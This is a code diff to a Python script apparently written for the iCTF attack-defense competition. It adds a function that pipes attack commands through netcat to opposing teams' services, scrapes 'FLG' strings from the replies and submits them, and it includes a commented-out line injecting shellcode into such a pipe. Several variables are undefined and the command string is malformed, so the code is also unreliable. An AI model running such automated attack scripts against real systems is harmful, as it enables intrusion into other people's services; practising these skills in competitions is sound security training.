@@ -9,6 +9,7 @@ from ictf import iCTF
 varList=[]
 varDict={}
 varIndexDict={}
+serviceList=[]
 
     
 def generateFinalCommandList(commandList,typeReq):
@@ -147,6 +148,51 @@ def attackTeams(command,teamNum):
                 finalCommandStr = commandToAttack(commandList)
                 print finalCommandStr
                 
+                getFlags(finalCommandStr,teamNum)
+        
+
+def getFlags(command,teamNum):
+    global serviceList,flagsList,t,serviceId
+    flagList=[]
+    result=[]
+    
+    #catpured flags will be subnitted
+    #print serviceList
+    #print os.system("echo 'X' '1492930308' | xargs -n 1 | nc team2 " + str(serviceList[1]['port']))
+    #flagId = t.get_targets(serviceId)
+    flagId=1082042629
+    #Here we need to pass shell code in echo
+    """
+    proc=subprocess.Popen("echo 'R' " + flagId + " '`python -c \"print " + shellcode + " \"`'" + " | xargs -n 1 | nc team"+teamNum + str(serviceList[serviceNum]['port']), shell=True, stdout=subprocess.PIPE,)"""
+        
+    proc=subprocess.Popen(command + "team"+serviceList[teamNum][team_id] + str(serviceList[serviceNum]['port']), shell=True, stdout=subprocess.PIPE,)
+        
+    
+    output=proc.communicate()[0]
+    print output
+
+    result = output.split(" ")
+
+    for i in range(0,len(result)):
+        try:
+            print result[i].index('FLG')
+            flagList=(result[i].split('\n'))
+            for j in range(0,len(flagList)):
+                if(flagList[j]!=''):
+                    flagsList.append(flagList[j])
+                    
+                    
+                    
+        except:
+             continue
+                
+                
+           
+    print flagsList
+    print t.submit_flag(flagsList)
+
+
+                
 
 #************************ gets Services after every tick ***************************
 def getServiceList():
@@ -176,4 +222,5 @@ p = multiprocessing.Pool(processes=5)
 p.map(f,range(teams))"""
 
 #To attack one team only just for testing
+getServiceList()
 attackTeams(finalCommandStr,2)
